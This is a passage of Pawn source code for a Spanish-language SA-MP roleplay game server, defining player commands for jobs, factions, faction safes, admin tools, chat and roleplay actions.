	        if(IsPlayerInRangeOfPoint(playerid,2,2430,-2115.69995117,13.8))
	        {
				if(InfoJugador[playerid][jLicenciaAuto] == false) return Error(playerid, "~b~Secretaria: ~w~Necesita licencia de conducción para manejar los camiones.");
	            InfoJugador[playerid][jNivelTrabajo] = 1;
	            InfoJugador[playerid][jTrabajo] = ID_Camionero;
	            AutoRol(playerid,"agarra una lapicera y firma el contrato para ser camionero");
	            Mensaje(playerid,-1,"Felicidades, ¡firmaste el contrato y ahora eres camionero!");
	            Mensaje(playerid,-1,"Cada vez que repartas los productos seleccionados se te pagará. También hay niveles,");
				Mensaje(playerid,-1,"entre más productos repartas tu nivel aumentará, y obtendrás más beneficios. (Ver "#CINFO"/informacion"#CBLANCO")");
				return 1;
			}
	        else if(IsPlayerInRangeOfPoint(playerid,2,-382.9777,-1426.2620,26.3193))
	        {
	            InfoJugador[playerid][jNivelTrabajo] = 1;
	            InfoJugador[playerid][jTrabajo] = ID_Cosechador;
	            AutoRol(playerid,"agarra una lapicera y firma el contrato para ser cosechador");
	            Mensaje(playerid,-1,"Felicidades, ¡firmaste el contrato y ahora eres cosechador!");
	            Mensaje(playerid,-1,"Para cosechar, debes subirte a una cosechadora y usar "#CINFO"(/cosechar)");
				return 1;
			}
	        else if(IsPlayerInRangeOfPoint(playerid,2,2028.3854,-1274.0673,20.9812))
	        {
	            InfoJugador[playerid][jNivelTrabajo] = 1;
	            InfoJugador[playerid][jTrabajo] = ID_RepartidorB;
	            AutoRol(playerid,"agarra una lapicera y firma el contrato para ser repartidor");
	            Mensaje(playerid,-1,"Felicidades, ¡firmaste el contrato y ahora eres repartidor de diarios!");
	            Mensaje(playerid,-1,"Para comenzar a repartir, usa "#CINFO"(/repartir)");
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid,2,1279.0297,-1248.3020,14.010))
			{
	            InfoJugador[playerid][jNivelTrabajo] = 1;
	            InfoJugador[playerid][jTrabajo] = ID_Basurero;
	            AutoRol(playerid,"agarra una lapicera y firma el contrato para ser basurero");
	            Mensaje(playerid,-1,"Felicidades, ¡firmaste el contrato y ahora eres basurero!");
	            Mensaje(playerid,-1,"Para comenzar a limpiar la ciudad, usa "#CINFO"(/comenzar limpieza)");
				return 1;
			}
			else if(IsPlayerInRangeOfPoint(playerid,2,992.4819,-1255.5576,15.0313))
			{
			    if( (InfoJugador[playerid][jEstrellas] > 1) || (ID_Familia(playerid) && InfoFamilia[ID_Familia(playerid)][fPandilla] ) )
				{
		            InfoJugador[playerid][jNivelTrabajo] = 1;
		            InfoJugador[playerid][jTrabajo] = ID_Ladron;
		            AutoRol(playerid,"deja una carta, indicando que ahora es un ladron");
		            Mensaje(playerid,-1,"Firmaste el contrato y ahora eres ladron.");
		            Mensaje(playerid,-1,"Para ver tus nuevos comandos, usa "#CINFO"(/informacion - 'Ladron')");
					return 1;
				}
				return Error(playerid,"¡Debes tener dos estrellas de rol, o ser pandillero!");
			}
			else if(IsPlayerInRangeOfPoint(playerid,2,2094.7319,-1830.0093,13.5737))
			{
	            InfoJugador[playerid][jNivelTrabajo] = 1;
	            InfoJugador[playerid][jTrabajo] = ID_RepartidorP;
	            AutoRol(playerid,"agarra una lapicera y firma para ser repartidor de pizza");
	            Mensaje(playerid,-1,"Felicidades, ¡firmaste el contrato y ahora eres repartidor de pizza!");
	            Mensaje(playerid,-1,"Para comenzar a repartir, usa "#CINFO"(/repartir pizza)");
				return 1;
			}
			return Error(playerid,"¡Aquí no hay una oficina ni un contrato!");
		}
		return ParamsINC(playerid,"/firmar <contrato>");
	}


	CMD:dejar(playerid,params[])
	{
		if(isnull(params)) return ParamsINC(playerid, "/dejar [faccion/familia/trabajo/camara/camilla/televisor]");
	    if(strcmp(params,"trabajo",true) == 0)
	    {
     		if(!InfoJugador[playerid][jTrabajo]) return Error(playerid,"¡No tienes un trabajo para dejar!");
			new TrabajoAnt[26];
			switch(InfoJugador[playerid][jTrabajo])
			{
			    case ID_Camionero: TrabajoAnt = "camionero";
			    case ID_Cosechador: TrabajoAnt = "cosechador";
			    case ID_RepartidorB: TrabajoAnt = "repartidor";
			    case ID_Basurero: TrabajoAnt = "basurero";
			    case ID_Ladron: TrabajoAnt = "ladrón";
			    case ID_RepartidorP: TrabajoAnt = "repartidor";
			    case ID_Taxista: TrabajoAnt = "taxista";
			}
			MensajeF(playerid, -1, "Renunciaste a tu trabajo, ya no eres más "#CINFO"%s.",TrabajoAnt);
			InfoJugador[playerid][jTrabajo] = 0;
			InfoJugador[playerid][jNivelTrabajo] = 1;
			return 1;
		}
	    else if(strcmp(params,"camara",true) == 0)
	    {
	        if(!GetPVarInt(playerid,"UsandoCamaras_SEG")) return Error(playerid,"¡No estás usando cámaras de seguridad!");
			TogglePlayerSpectating(playerid, false);
			SetPlayerPos(playerid,233.4676,123.4960,1003.21);
			SetPlayerInterior(playerid,10);
			Loop(i,4,0) TextDrawHideForPlayer(playerid,CAMARA_Seg[i]);
			DeletePVar(playerid,"UsandoCamaras_SEG");
			SetCameraBehindPlayer(playerid);
			return 1;
		}
		else if(strcmp(params,"camilla",true) == 0)
		{
			if(!EsMedico(playerid)) return Error(playerid,"¡No eres médico!");
			Loop(i, sizeof(Camillas), 0)
			{
				if(InfoCamilla[i][camiUsadaPor] == playerid)
				{
				    new
				        Float:Pos[4];

					GetPlayerFacingAngle(playerid, Pos[3]);
					GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
					GetPosInFrontOfPlayer(playerid, Pos[0], Pos[1], 2.0);

				    InfoCamilla[i][camiUsadaPor] = INVALID_PLAYER_ID;
				    Camillas[i][0] = Pos[0];
				    Camillas[i][1] = Pos[1];
				    Camillas[i][2] = Pos[2];
				    Camillas[i][3] = Pos[3];
			        KillTimer2(playerid, TIMER_CAMILLA);
	                SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
			        return 1;
				}
			}
			return Error(playerid,"¡No estas usando una camilla!");
		}
	    else if(strcmp(params,"televisor",true) == 0)
	    {
	        if(!GetPVarInt(playerid,"VIENDO_TV")) return Error(playerid,"¡No estás usando un televisor!");
	        
			TogglePlayerSpectating(playerid, false);
			
			new
			    Float:x, Float:y, Float:z, intid, vw;
			    
			x = GetPVarFloat(playerid, "TV_x");
			y = GetPVarFloat(playerid, "TV_y");
			z = GetPVarFloat(playerid, "TV_z");
			intid = GetPVarInt(playerid, "TV_int");
			vw = GetPVarInt(playerid, "TV_vw");

			SetPlayerPos(playerid, x, y, z);
			SetPlayerInterior(playerid,intid);
			SetPlayerVirtualWorld(playerid,vw);

			if(GetPVarInt(playerid, "T_DATOS"))
				cmd_datos(playerid, "no_msg");
			
			TextDrawHideForPlayer(playerid, TV_Apagado);
			TextDrawHideForPlayer(playerid, TV_Azul);
			
			SetCameraBehindPlayer(playerid);
			CancelSelectTextDraw(playerid);
			SacarTDTV(playerid);
			
			DeletePVar(playerid, "TV_CANAL");
			DeletePVar(playerid, "TV_ID");
			DeletePVar(playerid, "VIENDO_TV");
			DeletePVar(playerid, "TV_x");
			DeletePVar(playerid, "TV_y");
			DeletePVar(playerid, "TV_z");
		 	DeletePVar(playerid, "TV_int");
			DeletePVar(playerid, "TV_vw");
			
			CongelarEx(playerid, 3);
			return 1;
		}
	    if(strcmp(params,"faccion",true) == 0)
	    {
	        if(!InfoJugador[playerid][jMiembro]) return Error(playerid, "No eres miembro de una facción.");
			SacarLlavesFaccion(playerid);
	        MensajeFaccionF(InfoJugador[playerid][jMiembro], ""#CVERDE"[Facción] "#CBLANCO"El jugador "#CINFO"%s "#CBLANCO"se retiró voluntariamente de la facción.", NombreJugador_(playerid) );
	        InfoJugador[playerid][jMiembro] = 0;
	        return 1;
		}
	    if(strcmp(params,"familia",true) == 0)
	    {
	        if(!InfoJugador[playerid][jMiembroFam]) return Error(playerid, "No eres miembro de una familia.");
	        MensajeFaccionF(InfoJugador[playerid][jMiembroFam], ""#CVERDE"[Facción] "#CBLANCO"El jugador "#CINFO"%s "#CBLANCO"se retiró voluntariamente de la familia.", NombreJugador_(playerid) );
	        InfoJugador[playerid][jMiembroFam] = 0;
	        return 1;
		}
		return ParamsINC(playerid, "/dejar [faccion/familia/trabajo/camara/camilla/televisor]");
	}

	CMD:datos(playerid,params[])
	{
		if(!GetPVarInt(playerid,"T_DATOS"))
		{
			TextDrawHideForPlayer(playerid, Barraversion);
			HideProgressBarForPlayer(playerid, BHambre[playerid]);
			HideProgressBarForPlayer(playerid, BCansancio[playerid]);
			HideProgressBarForPlayer(playerid, BOrina[playerid]);
			HideProgressBarForPlayer(playerid, BExp[playerid]);
			TextDrawHideForPlayer(playerid, HS);
			TextDrawHideForPlayer(playerid, HoraB);
			SetPVarInt(playerid,"T_DATOS", 1);
			if(strcmp(params, "no_msg"))
				Mensaje(playerid,-1,"Tus datos fueron ocultados. "#CINFO"(/datos)");
			return 1;
		}
		else
		{
			TextDrawShowForPlayer(playerid, Barraversion);
			ShowProgressBarForPlayer(playerid, BHambre[playerid]);
			ShowProgressBarForPlayer(playerid, BCansancio[playerid]);
			ShowProgressBarForPlayer(playerid, BOrina[playerid]);
			ShowProgressBarForPlayer(playerid, BExp[playerid]);
			if( !IsPlayerInAnyVehicle(playerid) )
			{
				TextDrawShowForPlayer(playerid, HS);
				TextDrawShowForPlayer(playerid, HoraB);
			}
			DeletePVar(playerid,"T_DATOS");
			if(strcmp(params, "no_msg"))
				Mensaje(playerid,-1,"Tus datos fueron mostrados nuevamente. "#CINFO"(/datos)");
			return 1;
		}
	}


	CMD:cajafuerte(playerid,params[])
	{
		SetPVarInt(playerid,"PuedeSacar",0);
		if(IsPlayerInRangeOfPoint(playerid,2,253.19999695,292.50000000,984.90002441))//Hospital(LSMD)
  		{
  		    SetPVarInt(playerid,"CajaFuerte",CF_FACCION);
  		    if(InfoJugador[playerid][jMiembro] == IDLSMD)
  		    {
  		        ShowPlayerDialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar","Aceptar","Cancelar");
  		        return 1;
			}
			else if(InfoJugador[playerid][jLider] == IDLSMD)
			{
  		        ShowPlayerDialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar\nCambiar contraseña","Aceptar","Cancelar");
				return 1;
			}
			return Error(playerid,"No tienes los permisos para acceder a la caja fuerte.");
		}
		else if(IsPlayerInRangeOfPoint(playerid,1,317.6678,-159.0396,999.6010))//LSPD
  		{
  		    SetPVarInt(playerid,"CajaFuerte",CF_FACCION);
  		    if(InfoJugador[playerid][jMiembro] == IDLSPD)
  		    {
  		        ShowPlayerDialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar","Aceptar","Cancelar");
  		        return 1;
			}
			else if(InfoJugador[playerid][jLider] == IDLSPD)
			{
  		        ShowPlayerDialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar\nCambiar contraseña","Aceptar","Cancelar");
				return 1;
			}
			return Error(playerid,"No tienes los permisos para acceder a la caja fuerte.");
		}
		else if(IsPlayerInRangeOfPoint(playerid,1,287.7106,-31.4515,1001.515))//LSEM
  		{
  		    SetPVarInt(playerid,"CajaFuerte",CF_FACCION);
  		    if(InfoJugador[playerid][jMiembro] == IDLSEM)
  		    {
  		        ShowPlayerDialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar","Aceptar","Cancelar");
  		        return 1;
			}
			else if(InfoJugador[playerid][jLider] == IDLSEM)
			{
  		        ShowPlayerDialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar\nCambiar contraseña","Aceptar","Cancelar");
				return 1;
			}
			return Error(playerid,"No tienes los permisos para acceder a la caja fuerte.");
		}
		else if(IsPlayerInRangeOfPoint(playerid,1,372.0816,160.3729,1008.389))//Gobierno
		{
 		    SetPVarInt(playerid,"CajaFuerte",CF_FACCION);
  		    if(InfoJugador[playerid][jMiembro] == IDGOBIERNO)
  		    {
  		        ShowPlayerDialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar","Aceptar","Cancelar");
  		        return 1;
			}
			else if(InfoJugador[playerid][jLider] == IDGOBIERNO)
			{
  		        ShowPlayerDialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar\nCambiar contraseña","Aceptar","Cancelar");
				return 1;
			}
		}
		else if(IsPlayerInRangeOfPoint(playerid,1,1274.8182,-836.0779,1044.9656))//lstv
		{
 		    SetPVarInt(playerid,"CajaFuerte",CF_FACCION);
  		    if(InfoJugador[playerid][jMiembro] == IDLSTV)
  		    {
  		        ShowPlayerDialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar","Aceptar","Cancelar");
  		        return 1;
			}
			else if(InfoJugador[playerid][jLider] == IDLSTV)
			{
  		        ShowPlayerDialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar\nCambiar contraseña","Aceptar","Cancelar");
				return 1;
			}
			return Error(playerid,"No tienes los permisos para acceder a la caja fuerte.");
		}
		else if(IsPlayerInRangeOfPoint(playerid,1,1774.6583,-2026.5764,13.4843))//mecanicos
		{
 		    SetPVarInt(playerid,"CajaFuerte",CF_FACCION);
  		    if(InfoJugador[playerid][jMiembro] == IDMECANICOS)
  		    {
  		        ShowPlayerDialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar","Aceptar","Cancelar");
  		        return 1;
			}
			else if(InfoJugador[playerid][jLider] == IDMECANICOS)
			{
  		        ShowPlayerDialog(playerid,dCajaFuerte,DIALOG_STYLE_LIST,""#CINFO"Caja fuerte","Ver dinero\nDepositar\nSacar\nCambiar contraseña","Aceptar","Cancelar");
				return 1;
			}
			return Error(playerid,"No tienes los permisos para acceder a la caja fuerte.");
		}
		return Error(playerid,"¡Aquí no hay una caja fuerte!");
	}

	CMD:donar(playerid,params[])
	{
	    if(!IsPlayerInRangeOfPoint(playerid,4,2593.8953,1324.7419,866.3764)) return Error(playerid,"¡No estas en el hospital!");
	    if(sscanf(params,"is[7]",params[0],params[1])) return ParamsINC(playerid,"/donar [CANTIDAD] [dinero]");
	    if(params[0] < 1) return Error(playerid,"¡Debes donar un número positivo!");
		if(!strcmp(params[1],"dinero",true))
		{
		    if(params[0] > GetPlayerMoney(playerid) ) return Error(playerid, "No tienes esa cantidad de dinero.");
		    InfoFaccion[IDLSMD][fDinero] += params[0];
			MensajeF(playerid,-1,"¡Gracias por donar $%d! El hospital está muy agradecido",params[0]);
			QuitarDinero(playerid,params[0]);
		    ActualizarFacciones();
			return 1;
		}
		Mensaje(playerid,-1,"Item incorrecto. Los items son: "#CINFO"<dinero>");
		return 1;
	}

	CMD:admins(playerid,params[])
	{
	    if(InfoJugador[playerid][jNivel] < 1)
	        return Error(playerid, "Necesitas ser nivel dos para usar este comando.");
	        
	    new
			conteo,
			MSG[MAX_PLAYER_NAME + 6 + 8 + 20],
			Admins[sizeof(MSG)*20];

		foreach(Player,i)
  		{
	        if(InfoJugador[i][jAdmin] > Destacado)
	        {
	            conteo++;

				if(GetPVarInt(i,"ADMIN_ONDUTY"))
					format(MSG,sizeof(MSG),"%s "#CBLANCO"%s (Duty)\n",CheckRangoADM(i), NombreJugador_(i));
				else
					format(MSG,sizeof(MSG),"%s "#CBLANCO"%s\n",CheckRangoADM(i), NombreJugador_(i));

				strcat(Admins,MSG);
			}
		}
		if(!conteo)
			return Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,"Ningún administrador",""#CBLANCO"No hay administradores conectados.","Aceptar","");

		A_Format(MSG,""#CBLANCO"Administradores: "#CINFO"%d",conteo);

		ShowPlayerDialog(playerid,dError,DIALOG_STYLE_MSGBOX,MSG,Admins,"Aceptar","");
		return 1;
	}

	CMD:informacion(playerid,params[])
	{
		new
		    Menu[] = ""#CINFO"• "#CBLANCO"Comandos generales\n"#CINFO"• "#CBLANCO"Trabajos\n"#CINFO"• "#CBLANCO"Facciones\n"#CINFO"• "#CBLANCO"Vehículos\n"#CINFO"• "#CBLANCO"Casas\n"#CINFO"• "#CBLANCO"Negocios\n"#CINFO"• "#CBLANCO"Familias y bandas\n"#CINFO"• "#CBLANCO"Necesidades (Barras)\n"#CINFO"• "#CBLANCO"Pandillas y zonas";

		Dialog(playerid, dAyuda, DIALOG_STYLE_LIST, ""#CBLANCO"Información del servidor - "#CINFO"MENU", Menu, "Aceptar", "Cancelar");
		return 1;
	}

	CMD:aa(playerid,params[])
	{
		if(!InfoJugador[playerid][jAdmin]) return Error(playerid,"¡No perteneces al staff!");
		
		new
			Str [sizeof(AyudaDestacado)
				+sizeof(AyudaAyudante)
				+sizeof(AyudaModerador)
				+sizeof(AyudaModSuperior)
				+sizeof(AyudaAdministrador)
				+sizeof(AyudaSubDueno)
				+sizeof(AyudaDueno)];

		switch(InfoJugador[playerid][jAdmin])
		{
			case Destacado:
			{
				strcat(Str,AyudaDestacado);
			}
			case Ayudante:
			{
				strcat(Str,AyudaDestacado);
				strcat(Str,AyudaAyudante);
			}
			case Colaborador:
			{
				strcat(Str,AyudaDestacado);
				strcat(Str,AyudaAyudante);
			}
			case Moderador:
			{
				strcat(Str,AyudaDestacado);
				strcat(Str,AyudaAyudante);
				strcat(Str,AyudaModerador);
			}
			case Mod.Superior:
			{
				strcat(Str,AyudaDestacado);
				strcat(Str,AyudaAyudante);
				strcat(Str,AyudaModerador);
				strcat(Str,AyudaModSuperior);
			}
			case Administrador, AdministradorSup:
			{
				strcat(Str,AyudaDestacado);
				strcat(Str,AyudaAyudante);
				strcat(Str,AyudaModerador);
				strcat(Str,AyudaModSuperior);
				strcat(Str,AyudaAdministrador);
			}
			case SubDueno:
			{
				strcat(Str,AyudaDestacado);
				strcat(Str,AyudaAyudante);
				strcat(Str,AyudaModerador);
				strcat(Str,AyudaModSuperior);
				strcat(Str,AyudaAdministrador);
				strcat(Str,AyudaSubDueno);
			}
			case Dueno:
			{
				strcat(Str,AyudaDestacado);
				strcat(Str,AyudaAyudante);
				strcat(Str,AyudaModerador);
				strcat(Str,AyudaModSuperior);
				strcat(Str,AyudaAdministrador);
				strcat(Str,AyudaSubDueno);
				strcat(Str,AyudaDueno);
			}
		}
		Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"> Sistema de administración - COMANDOS",Str,"Cerrar","");
		return 1;
	}

	CMD:silenciar(playerid,params[])
	{
	    if(Staff(playerid,Ayudante)) return 1;
		if(sscanf(params,"uis[80]",params[0],params[1],params[2])) return ParamsINC(playerid,"/silenciar [ID/NOMBRE] [MINUTOS] [RAZÓN]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "Jugador desconectado");
		if(params[1] && InfoJugador[params[0]][jTiempoDudas] > 40) return Error(playerid, "Ese jugador ya está silenciado.");
	    MensajeTodosF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s silenció a %s por %d minutos "#CROJO"[%s]",NombreJugador_(playerid),NombreJugador_(params[0]),params[1],params[2]);

		InfoJugador[params[0]][jTiempoDudas] = 60*params[1];
	    return 1;
	}

	CMD:llenarbarras(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		InfoJugador[playerid][jHambre] = 100.0;
		InfoJugador[playerid][jCansancio] = 100.0;
		InfoJugador[playerid][jOrina] = 0.0;
		Mensaje(playerid, -1, "Todas tus barras se llenaron.");
		return 1;
	}


	CMD:o(playerid,params[])
	{
		if(isnull(params)) return ParamsINC(playerid,"/o [Texto]");

		if(Staff(playerid,Moderador)) return 1;

		MensajeTodosF(0x5FB2FFFF,"[Admin] %s(%d):"#CBLANCO" %s",
			NombreJugador_(playerid),
			playerid,
			params);

		return 1;
	}

	CMD:info1(playerid,params[])
	{
	    if(Staff(playerid,Ayudante)) return 1;
	    MensajeTodos(-1,"- ¡No olvides registrarte en nuestra página web! "#CAZUL2""#FORO_SERVER"");
		MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s usó el comando /info1",Destacado, NombreJugador_(playerid));
	    return 1;
	}

 	CMD:info2(playerid,params[])
	{
	    if(Staff(playerid,Ayudante)) return 1;
	    MensajeTodos(-1,"- ¡Conectate a nuestro servidor TeamSpeak 3! "#CVERDE"ts3.optimus-rp.com:9989");
		MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s usó el comando /info2",Destacado, NombreJugador_(playerid));
	    return 1;
	}

	CMD:traertodos(playerid,params[])
	{
		return Error(playerid, "Comando deshabilitado.");
		
/*	    if(Staff(playerid,Administrador)) return 1;
	    Para_Admin_Servicio
	    new Float:_P[3];
	    GetPlayerPos(playerid, _P[0], _P[1], _P[2]);
	    foreach(Player,i)
	    {
	        SetPlayerPos(i, _P[0] + float (random(3)), _P[1] + float (random(3)), _P[2]);
		}
		MensajeTodosF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s teletransportó a todos hacia el.",NombreJugador_(playerid));
		return 1;
*/
	}

	CMD:virtualworld(playerid,params[])
	{
		MensajeF(playerid, C_GRIS,"VirtualWorld: %d",GetPlayerVirtualWorld(playerid));
		return 1;
	}


	CMD:id(playerid,params[])
	{
		if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/id [NOMBRE]"),1;
		if(!IsPlayerConnected(params[0])) return Error(playerid, "¡Jugador desconectado!");
		MensajeF(playerid, -1, "ID: "#CPOSITIVO"[%d] "#CBLANCO"| Nombre completo: "#CINFO"%s",params[0],pName(params[0]));
		return 1;
	}

	CMD:b(playerid, params[])
	{
		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/b %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM");
			return 0;
		}
		if(isnull(params)) return ParamsINC(playerid, "/b [Texto]");

		new
			String[40 + 128];

	    format(String, sizeof(String), "(( OOC [ID: %d] %s: %s ))", playerid, NombreJugador(playerid), params);
     	ProxDetector(20.0, playerid, String,-1,Hablar,Hablar2,Hablar3,Hablar4);
		return 1;
	}

	CMD:g(playerid, params[])
	{
		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/g %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM");
			return 0;
		}

		if(isnull(params)) return ParamsINC(playerid, "/g [Texto]");

		new
			String[158];

	 	A_Format(String, "%s (Gritando): ¡%s!",NombreJugador(playerid), params);
   		ProxDetector(60.0, playerid, String,-1,Hablar,Hablar2,Hablar3,Hablar4);

   		A_Format(String, "(Gritando) ¡%s!", params);
   		SetPlayerChatBubble(playerid,String,0x7BDA00FF,60,strlen(params) * 200);
		return 1;
	}

	CMD:s(playerid, params[])
	{
		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/s %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM");
			return 0;
		}

		if(isnull(params)) return ParamsINC(playerid, "/s [Texto]");

		new
			String[158];

	 	A_Format(String, "%s (Susurra): %s",NombreJugador(playerid), params);
   		ProxDetector(5.0, playerid, String,-1,Hablar,Hablar2,Hablar3,Hablar4);

   		A_Format(String, "(Susurro) %s", params);
   		SetPlayerChatBubble(playerid,String,0x7BDA00FF,5.0,strlen(params) * 200);
		return 1;
	}


	CMD:ame(playerid, params[])
	{
		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/ame %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM");
			return 0;
		}

		if(isnull(params)) return ParamsINC(playerid, "/ame [Acción]");

		new
			String[155];

	    format(String, sizeof(String), " * a %s %s *",NombreJugador(playerid), params);
     	ProxDetector(20.0, playerid, String, C_ME,C_ME,C_ME,C_ME,C_ME);

		return 1;
	}

	CMD:me(playerid, params[])
	{
		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/me %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM");
			return 0;
		}
  		if(isnull(params)) return ParamsINC(playerid,"/me [Acción]");
		AutoRol(playerid,params);
		return 1;
	}

	CMD:do(playerid, params[])
	{
		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/do %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM");
			return 0;
		}

  		if(isnull(params)) return ParamsINC(playerid,"/do [Acción]");

		new
			String[158];

	    format(String, sizeof(String), " * %s (( %s ))", params, NombreJugador(playerid));
     	ProxDetector(20.0, playerid, String, C_POSITIVO,C_POSITIVO,C_POSITIVO,C_POSITIVO,C_POSITIVO);
		return 1;
	}

	CMD:intentar(playerid, params[])
	{
		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/intentar %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM");
			return 0;
		}

  		if(isnull(params)) return ParamsINC(playerid,"/intentar [Acción]");

		new
			String[160];

	 	switch(random(2))
	  	{
	   		case 0:
	     	{
			    format(String, sizeof(String), " * %s intenta %s, pero falla *",NombreJugador(playerid), params);
	            ProxDetector(20.0, playerid, String,C_NEGATIVO,C_NEGATIVO,C_NEGATIVO,C_NEGATIVO,C_NEGATIVO);
			}
			case 1:
	     	{
			    format(String, sizeof(String), " * %s intenta %s, y lo logra *",NombreJugador(playerid), params);
	            ProxDetector(20.0, playerid, String,C_POSITIVO,C_POSITIVO,C_POSITIVO,C_POSITIVO,C_POSITIVO);
			}
		}
		return 1;
	}


	CMD:servicio(playerid,params[])
	{
	    if(EsLSPD(playerid))
	    {
	        if(!IsPlayerInRangeOfPoint(playerid,2,256.2291,120.4342,1003.218)) return Error(playerid,"¡No puedes ponerte aquí en servicio!");
			if(GetPVarInt(playerid,"FAC_ENSERVICIO"))
			{
				#if defined ANUNCIO_SERVICIO
			    new Str[100];
			    A_Format(Str,"> (GOBIERNO) El oficial "#CLSPD"%s "#CBLANCO"salió de servicio. "#CINFO"(Número: "#NUMERO_POLICIA")",NombreJugador_(playerid));
				MensajeTodos(C_BLANCO,Str);
				#endif
			    Mensaje(playerid,-1,"- Saliste de servicio.");
				DeletePVar(playerid,"FAC_ENSERVICIO");
				SetPlayerColor(playerid,0xFFFFFF00);
				return 1;
			}
			else
			{
				#if defined ANUNCIO_SERVICIO
			    new Str[100];
			    A_Format(Str,"> (GOBIERNO) El oficial "#CLSPD"%s "#CBLANCO"está en servicio. "#CINFO"(Número: "#NUMERO_POLICIA")",NombreJugador_(playerid));
				MensajeTodos(C_BLANCO,Str);
				#endif
			    Mensaje(playerid,-1,"- Ahora estás en servicio, tu nombre se marcó con color.");
				SetPVarInt(playerid,"FAC_ENSERVICIO",1);
				SetPlayerColor(playerid,C_DUTYLSPD);
				return 1;
			}
		}
		else if(EsMedico(playerid))
		{
	        if(!IsPlayerInRangeOfPoint(playerid,2,2557.8733,1262.8485,866.3764)) return Error(playerid,"¡No puedes ponerte aquí en servicio!");
			if(GetPVarInt(playerid,"FAC_ENSERVICIO"))
			{
				#if defined ANUNCIO_SERVICIO
			    new Str[100];
			    A_Format(Str,"> (GOBIERNO) El médico "#CLSMD"%s "#CBLANCO"salió de servicio. "#CINFO"(Número: "#NUMERO_HOSPITAL")",NombreJugador_(playerid));
				MensajeTodos(C_BLANCO,Str);
				#endif
			    Mensaje(playerid,-1,"- Saliste de servicio.");
				DeletePVar(playerid,"FAC_ENSERVICIO");
				SetPlayerColor(playerid,0xFFFFFF00);
				return 1;
			}
			else
			{
				#if defined ANUNCIO_SERVICIO
			    new Str[100];
			    A_Format(Str,"> (GOBIERNO) El médico "#CLSMD"%s "#CBLANCO"está en servicio. "#CINFO"(Número: "#NUMERO_HOSPITAL")",NombreJugador_(playerid));
				MensajeTodos(C_BLANCO,Str);
				#endif
			    Mensaje(playerid,-1,"- Ahora estás en servicio, tu nombre se marcó con color.");
				SetPVarInt(playerid,"FAC_ENSERVICIO",1);
				SetPlayerColor(playerid,C_DUTYLSMD);
				return 1;
			}
		}
		else if(EsMilitar(playerid))
		{
		    if(!IsPlayerInRangeOfPoint(playerid, 2, 2744.3435,-2453.8425,13.8623)) return Error(playerid, "¡No puedes ponerte aquí en servicio!");
			if(GetPVarInt(playerid,"FAC_ENSERVICIO"))
			{
				#if defined ANUNCIO_SERVICIO
			    new Str[100];
			    A_Format(Str,"> (GOBIERNO) El militar "#CLSEM"%s "#CBLANCO"salió de servicio. "#CINFO"(Número: "#NUMERO_HOSPITAL")",NombreJugador_(playerid));
				MensajeTodos(C_BLANCO,Str);
				#endif
			    Mensaje(playerid,-1,"- Saliste de servicio.");
				DeletePVar(playerid,"FAC_ENSERVICIO");
				SetPlayerColor(playerid,0xFFFFFF00);
				return 1;
			}
			else
			{
